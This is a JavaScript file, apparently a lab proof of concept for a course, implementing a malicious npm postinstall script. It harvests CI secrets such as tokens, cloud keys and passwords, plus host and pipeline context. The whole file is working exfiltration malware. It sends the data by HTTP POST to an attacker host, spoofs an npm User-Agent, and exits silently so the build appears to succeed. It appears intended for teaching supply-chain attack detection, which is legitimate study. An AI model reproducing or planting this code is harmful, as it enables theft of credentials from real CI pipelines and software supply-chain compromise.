/**
 * [PoC - NT230] Malicious postinstall script — CI Secret Theft
 *
 * Attack vector: T1195.002 (Supply Chain: Software)
 * Behavior:    - Triggers during `npm install` inside CI pipeline
 *              - Reads sensitive env vars (CI tokens, cloud keys, deploy creds)
 *              - Exfiltrates via HTTP POST to attacker-controlled server
 *              - Silent — exits cleanly so build pipeline does not fail
 *
 * Kết quả kỳ vọng khi chạy trong CI:
 *   Attacker server nhận được JSON chứa:
 *     { CI_JOB_TOKEN, GITHUB_TOKEN, AWS_SECRET_ACCESS_KEY, NPM_TOKEN, ... }
 */

"use strict";

const http = require("http");
const os = require("os");

// ─── Config ────────────────────────────────────────────────────────────────
const ATTACKER_HOST = "172.30.0.20"; // IP attacker container (Docker bridge network)
const ATTACKER_PORT = 8080;
const EXFIL_PATH = "/exfil/secrets";
const TIMEOUT_MS = 5000; // fail-silent sau 5s nếu attacker offline
// ───────────────────────────────────────────────────────────────────────────

/**
 * Thu thập tất cả env vars liên quan đến secrets/credentials.
 * Lọc theo keyword phổ biến trong CI environments.
 */
function harvestCISecrets() {
  const SENSITIVE_KEYWORDS = [
    "TOKEN",
    "SECRET",
    "KEY",
    "PASSWORD",
    "PASS",
    "CREDENTIAL",
    "AUTH",
    "PRIVATE",
    "ACCESS",
    "API",
  ];

  const secrets = {};
  for (const [k, v] of Object.entries(process.env)) {
    if (SENSITIVE_KEYWORDS.some((kw) => k.toUpperCase().includes(kw))) {
      secrets[k] = v;
    }
  }
  return secrets;
}

/**
 * Thu thập thông tin môi trường CI để attacker biết đang ở đâu.
 * (GitLab CI, GitHub Actions, Jenkins, etc.)
 */
function harvestCIContext() {
  return {
    // --- GitLab CI ---
    CI_SERVER_URL: process.env.CI_SERVER_URL,
    CI_PROJECT_PATH: process.env.CI_PROJECT_PATH,
    CI_PROJECT_URL: process.env.CI_PROJECT_URL,
    CI_COMMIT_REF_NAME: process.env.CI_COMMIT_REF_NAME,
    CI_JOB_ID: process.env.CI_JOB_ID,
    CI_RUNNER_ID: process.env.CI_RUNNER_ID,
    GITLAB_USER_EMAIL: process.env.GITLAB_USER_EMAIL,

    // --- GitHub Actions ---
    GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY,
    GITHUB_ACTOR: process.env.GITHUB_ACTOR,
    GITHUB_REF: process.env.GITHUB_REF,
    GITHUB_SERVER_URL: process.env.GITHUB_SERVER_URL,

    // --- Generic ---
    CI: process.env.CI,
    hostname: os.hostname(),
    platform: os.platform(),
    username: os.userInfo().username,
    cwd: process.cwd(),
    node_version: process.version,
  };
}

/**
 * Gửi payload về attacker server qua HTTP POST.
 * Fail-silent: nếu server không lắng nghe thì bỏ qua, không làm crash build.
 */
function exfiltrate(payload) {
  return new Promise((resolve) => {
    const body = JSON.stringify(payload);
    const options = {
      hostname: ATTACKER_HOST,
      port: ATTACKER_PORT,
      path: EXFIL_PATH,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(body),
        // Giả mạo User-Agent trông như traffic bình thường
        "User-Agent": "npm/10.2.3 node/v20.10.0",
      },
    };

    const req = http.request(options, (res) => {
      res.resume(); // drain response
      resolve();
    });

    req.setTimeout(TIMEOUT_MS, () => {
      req.destroy();
      resolve(); // timeout — bỏ qua, không crash
    });

    req.on("error", () => resolve()); // network error — bỏ qua
    req.write(body);
    req.end();
  });
}

// ─── Main ──────────────────────────────────────────────────────────────────
async function main() {
  const payload = {
    event: "postinstall",
    timestamp: new Date().toISOString(),
    context: harvestCIContext(),
    secrets: harvestCISecrets(),
  };

  await exfiltrate(payload);

  // Không in gì ra stdout/stderr — im lặng hoàn toàn
  // Build pipeline nhìn vào thấy postinstall "thành công"
  process.exit(0);
}

main();
